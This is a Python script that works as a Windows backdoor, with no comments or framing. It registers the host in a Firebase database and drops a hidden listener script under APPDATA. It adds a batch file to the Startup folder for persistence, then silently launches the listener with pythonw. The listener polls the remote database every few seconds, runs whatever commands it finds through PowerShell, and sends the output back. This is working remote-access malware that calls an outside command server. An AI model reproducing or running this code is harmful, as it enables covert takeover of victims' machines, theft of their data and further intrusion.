import requests, json, random as rd, os, subprocess, time

BASE_URL = "https://moms-tailor-default-rtdb.firebaseio.com/first-start"
DATABASE_URL = f"{BASE_URL}.json"
hostname = os.getlogin() + str(rd.randint(0, 100))
requests.patch(DATABASE_URL, data=json.dumps({hostname: {"output": "", "command": ""}}))
current_dir = os.getcwd()

def setup():
    systemcom_path = os.path.join(os.getenv("APPDATA"), "systemcom")
    print(systemcom_path)
    os.makedirs(systemcom_path, exist_ok=True)
    lock_file = os.path.join(systemcom_path, "lock.txt")
    if os.path.exists(lock_file):
        return  # Prevent multiple executions
    open(lock_file, "w").close()
    script_path = os.path.join(systemcom_path, "command_listener.py")
    batch_path = os.path.join(systemcom_path, "start_listener.bat")
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\Windows\Start Menu\Programs\Startup")
    startup_batch_path = os.path.join(startup_folder, "start_listener.bat")
    
    script_content = f"""
import requests, json, random as rd, os, subprocess, time
BASE_URL = "{BASE_URL}"
DATABASE_URL = f"{{BASE_URL}}.json"
hostname = os.getlogin() + str(rd.randint(0, 100))
requests.patch(DATABASE_URL, data=json.dumps({{hostname: {{"output": "", "command": ""}}}}))
current_dir = os.getcwd()

def check_and_execute():
    global current_dir
    while True:
        try:
            response = requests.get(DATABASE_URL)
            if response.status_code == 200:
                db_data = response.json()
                if hostname in db_data:
                    command = db_data[hostname].get("command", "")
                    if command:
                        print(f"Executing: {{command}}")
                        if command.lower().startswith("cd "):
                            new_dir = command[3:].strip()
                            current_dir = os.path.dirname(current_dir) if new_dir == ".." else os.path.join(current_dir, new_dir) if os.path.isdir(os.path.join(current_dir, new_dir)) else current_dir
                        else:
                            process = subprocess.run(["powershell", "-Command", command], cwd=current_dir, capture_output=True, text=True)
                            output = process.stdout or process.stderr
                            requests.patch(f"{{BASE_URL}}/{{hostname}}.json", data=json.dumps({{"output": output, "command": ""}}))
            time.sleep(5)
        except Exception as e:
            requests.patch(f"{{BASE_URL}}/{{hostname}}.json", data=json.dumps({{"output": str(e), "command": ""}}))
            time.sleep(10)

check_and_execute()
"""
    
    with open(script_path, "w") as script_file:
        script_file.write(script_content)
    
    with open(batch_path, "w") as batch_file:
        batch_file.write(f"pythonw \"{script_path}\"")
    
    os.replace(batch_path, startup_batch_path)
    subprocess.Popen(["pythonw", script_path], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
setup()
